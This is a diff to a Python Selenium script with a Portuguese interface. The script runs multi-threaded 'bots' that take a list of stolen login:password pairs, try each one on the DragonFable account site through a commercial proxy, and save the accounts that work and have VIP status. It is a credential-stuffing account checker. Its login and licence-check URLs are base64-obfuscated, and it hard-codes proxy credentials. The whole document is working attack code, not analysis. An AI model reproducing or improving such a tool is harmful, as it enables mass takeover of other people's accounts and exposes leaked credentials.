@@ -23,14 +23,17 @@ LOGIN_URL = base64.b64decode('aHR0cHM6Ly9hY2NvdW50LmRyYWdvbmZhYmxlLmNvbS9Mb2dpbg
 PROXY = 'http://brd-customer-hl_ddb02df8-zone-data_center:a9unexspqppa@zproxy.lum-superproxy.io:22225'
 LIST_THREADS = []
 PERCENT = '0%'
-BOTS_NUMBER = 9
+BOTS_NUMBER = 5
 
 MAX_LIST_NUMBER = 0
+TOTAL_LIST_NUMBER = 0
+THREADS_WORKERS = []
 
 ver_url = base64.b64decode('aHR0cHM6Ly9qb2NpbWFybG9wZXMuY29tL3ZlcmlmeS9kYXRhLmpzb24=')
 ver = requests.get(ver_url.decode('utf-8'))
 ver = (json.loads(ver.text))['dragon_fable']
 win = sys.platform.startswith("win")
+thread_count = 1
 
 global vips
 vips = ''
@@ -77,11 +80,13 @@ def iniciar():
             driver.get(LOGIN_URL.decode('utf-8'))
         sleep(1)
     i = 0
+    print('- Acessando Dragon Fable Login')
     driver.minimize_window()
     while MAX_LIST_NUMBER > 0:
         try:
-            progressBarSet(MAX_LIST_NUMBER)
+            MAX_LIST_NUMBER = MAX_LIST_NUMBER - 1
             doLogin(list_data[randint(0, MAX_LIST_NUMBER)], driver)
+            progressBarSet()
             while 'DF Manage Acct' not in driver.title:
                 print('- Tentando acessar Dragon Fable')
                 if 'Access denied' in driver.title:
@@ -100,13 +105,10 @@ def iniciar():
             driver.get(LOGIN_URL.decode('utf-8'))
             pass
         sleep(0.6)
-    driver.delete_all_cookies()
-    driver.quit()
-    progressBarSet(MAX_LIST_NUMBER)
-    messagebox.showinfo('Verificação concluída', 'Por favor, \nescolha o local para \nsalvar o arquivo:\n\n"dragonfable_results.txt"')
-    save_vips_to_file()
+    finish_threads()
                     
 def doLogin(data, driver):
+    print(data)
     global MAX_LIST_NUMBER
     try:
         user = WebDriverWait(driver, 10).until(
@@ -126,7 +128,6 @@ def doLogin(data, driver):
         driver.find_element(By.ID, 'ppp').send_keys(data['pass'])
         driver.find_element(By.XPATH, '//*[@id="formLogin"]/div[3]/div[2]/button').click()
     finally:
-        MAX_LIST_NUMBER = MAX_LIST_NUMBER - 1
         try:
             WebDriverWait(driver, 3).until(
                 EC.presence_of_element_located((By.XPATH, '//*[@id="LeftPane"]/div/a[2]'))
@@ -135,13 +136,10 @@ def doLogin(data, driver):
             verifyVip(data, driver)
             sleep(0.2)
             logout(driver)
-            print(data)
-            list_data.remove({'user': data['user'], 'pass': data['pass']})
+            list_data.remove(data)
         except Exception as e:
             logs_to_infos_file('ERROR - ' + str(data['user']) + ':' + str(data['pass']))
-            print(data)
             list_data.remove({'user': data['user'], 'pass': data['pass']})
-            pass
             
 def logout(driver):
     driver.find_element(By.XPATH, '//*[@id="LeftPane"]/div/a[11]').click()
@@ -184,8 +182,8 @@ def read_data_from_file(directory=None):
             password = (item.split(':'))[1]
             list_data.append({'user': user, 'pass': password})
         except:
-            print('Credenciais em formato inválido')
-    number_accounts.configure(text="{}/{}".format(0, len(list_data)))
+            print('- Removendo credencial em formato inválido da lista')
+    number_accounts.configure(text="{}".format(len(list_data)))
     
 def read_proxies_from_file(directory=None):
     file = open(directory if directory else './proxies.txt', 'r', encoding='utf8')
@@ -216,17 +214,39 @@ def addLoginList():
             read_data_from_file(filename)
     except Exception as e:
         print(e)
+
+def finish_threads(refresh = False):
+    global thread_count
+    global THREADS_WORKERS
+    for thread in THREADS_WORKERS:
+        if not thread.is_alive():
+            thread_count = thread_count + 1
+            thread.join()
+            THREADS_WORKERS.remove(thread)
+    if not refresh:
+        if thread_count >= BOTS_NUMBER:
+            progressBarSet(True)
+            messagebox.showinfo('Verificação concluída', 'Por favor, \nescolha o local para \nsalvar o arquivo:\n\n"dragonfable_results.txt"')
+            save_vips_to_file()
+    
 def start():
+    global THREADS_WORKERS
+    global TOTAL_LIST_NUMBER
+    global MAX_LIST_NUMBER
     if ver:
         sleep(1)
         if len(list_data):
             try:
+                TOTAL_LIST_NUMBER = len(list_data)
                 for item in range(0, BOTS_NUMBER):
-                    print('\n\nFoi {}\n\n'.format(item))
-                    Thread(target=iniciar).start()
+                    print('\n\nIniciando Bot - {}\n\n'.format(item))
+                    t = Thread(target=iniciar)
+                    THREADS_WORKERS.append(t)
+                    t.start()
                     sleep(3)
             except Exception as e:
                 print(e)
+                pass
         else:
             messagebox.showinfo('Adicione o arquivo com as autenticações', 'Você precisa adicionar um arquivo TXT contendo login:senha separados linha por linha.')
     else:
@@ -253,14 +273,20 @@ def logs_to_infos_file(log, dir_file=None):
     with open(dir_file if dir_file else 'logs.txt', 'w') as wfile:
         wfile.write(lines + log)
         return
-
-def progressBarSet(percent):
+TOTAL_PROGRESS = 0
+def progressBarSet(finish = False):
+    global TOTAL_LIST_NUMBER
+    global TOTAL_PROGRESS
+    global MAX_LIST_NUMBER
     try:
-        perc = "{:.2f}".format(percent)
-        PERCENT = str(float(perc) * 100) + '%'
-        percent_text.configure(text=PERCENT)
-        number_accounts.configure(text="{}".format(len(list_data)))
-        progressbar.set(percent)
+        number_accounts.configure(text="{}".format(str(MAX_LIST_NUMBER)))
+        progress = 1 / TOTAL_LIST_NUMBER
+        progress = "{:.4f}".format(progress)
+        TOTAL_PROGRESS = TOTAL_PROGRESS + float(progress)
+        if finish:
+            progressbar.set(1)
+        else:
+            progressbar.set(TOTAL_PROGRESS)
         root.update_idletasks()
     except Exception as e:
         print(e)
@@ -288,7 +314,7 @@ def continue_by_logs():
                 user = {'user': data_log[0], 'pass': data_log[1]}
                 print(user)
                 if user in list_data:
-                    print('- Tem na lista!')
+                    print('- Removendo da lista!\n')
                     list_data.remove(user)
                     contas_removidas = contas_removidas + 1
             if len(list_data):
@@ -322,8 +348,6 @@ if __name__ == '__main__':
     start_button.place(relx=0.4, rely=0.5, anchor=ctk.CENTER)
     continue_button_by_logs = ctk.CTkButton(master=root, width=150, text="continue", text_color="#00FF7F", command=continue_thread)
     continue_button_by_logs.place(relx=0.6, rely=0.5, anchor=ctk.CENTER)
-    percent_text = ctk.CTkLabel(master=root, text=PERCENT, text_color="#fff", justify="center")
-    percent_text.place(relx=0.5, rely=0.64, anchor=ctk.CENTER)
     progressbar = ctk.CTkProgressBar(master=canvas, width=400, mode='determinate', orient=HORIZONTAL)
     progressbar.place(relx=0.5, rely=0.7, anchor=ctk.CENTER)
     progressbar.set(0)
